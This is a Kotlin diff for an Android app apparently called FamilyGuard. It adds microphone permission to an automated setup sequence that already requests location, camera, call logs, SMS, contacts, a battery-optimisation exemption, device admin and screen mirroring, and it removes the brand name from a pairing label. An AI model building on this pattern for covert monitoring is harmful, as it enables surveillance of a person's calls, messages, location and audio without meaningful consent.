@@ -129,6 +129,9 @@ class MainActivity : ComponentActivity() {
     private fun hasCamera(ctx: Context): Boolean =
         ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
 
+    private fun hasMic(ctx: Context): Boolean =
+        ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+
     private fun hasCallsPerms(ctx: Context): Boolean =
         ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED ||
             ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
@@ -168,6 +171,7 @@ class MainActivity : ComponentActivity() {
         locLauncher: ActivityResultLauncher<Array<String>>,
         camLauncher: ActivityResultLauncher<String>,
         callsLauncher: ActivityResultLauncher<Array<String>>,
+        micLauncher: ActivityResultLauncher<String>,
         onProgress: (String) -> Unit
     ): String {
         data class AutoStep(val key: String, val done: () -> Boolean, val launch: () -> Unit, val timeoutMs: Long = 30_000L)
@@ -205,6 +209,7 @@ class MainActivity : ComponentActivity() {
                     arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS)
                 )
             }),
+            AutoStep("mic", { hasMic(ctx) }, { micLauncher.launch(Manifest.permission.RECORD_AUDIO) }),
             AutoStep("battery", { hasBatteryIgnore(ctx) }, { requestIgnoreBattery(ctx) }),
             AutoStep("admin", { hasAdmin(ctx) }, { runCatching { ctx.startActivity(adminIntent) } }),
             AutoStep("mirror", { MirrorManager.hasProjection }, {
@@ -262,6 +267,7 @@ class MainActivity : ComponentActivity() {
         val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
         val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
         val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
+        val micLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
         var autoBusy by remember { mutableStateOf(false) }
         var autoMsg by remember { mutableStateOf("") }
         var autoSetupDone by remember { mutableStateOf(false) }
@@ -310,7 +316,7 @@ class MainActivity : ComponentActivity() {
             autoBusy = true
             autoMsg = "Auto-setup chal raha hai…"
             autoMsg = autoGrantSequence(
-                this@MainActivity, locLauncher, camLauncher, callsLauncher
+                this@MainActivity, locLauncher, camLauncher, callsLauncher, micLauncher
             ) { p -> autoMsg = p }
             autoBusy = false
             if (coreDone()) {
@@ -456,6 +462,7 @@ class MainActivity : ComponentActivity() {
         val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
         val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
         val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
+        val micLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
         val adminLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {}
         var autoMsg by remember { mutableStateOf("") }
         var autoBusy by remember { mutableStateOf(false) }
@@ -480,7 +487,7 @@ class MainActivity : ComponentActivity() {
                     autoBusy = true
                     scope.launch {
                         autoMsg = autoGrantSequence(
-                            ctx, locLauncher, camLauncher, callsLauncher
+                            ctx, locLauncher, camLauncher, callsLauncher, micLauncher
                         ) { p -> autoMsg = p }
                         autoBusy = false
                     }
@@ -651,7 +658,7 @@ class MainActivity : ComponentActivity() {
 
         Card(modifier = Modifier.fillMaxWidth()) {
             Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                Text("Step 1 · Pair with FamilyGuard", style = MaterialTheme.typography.titleSmall)
+                Text("Step 1 · Pair karo", style = MaterialTheme.typography.titleSmall)
                 if (Store.pendingPairCode.isNotBlank() && !busy) {
                     Text(
                         "⚡ Setup link se khula — Pair khud ho jayega…",
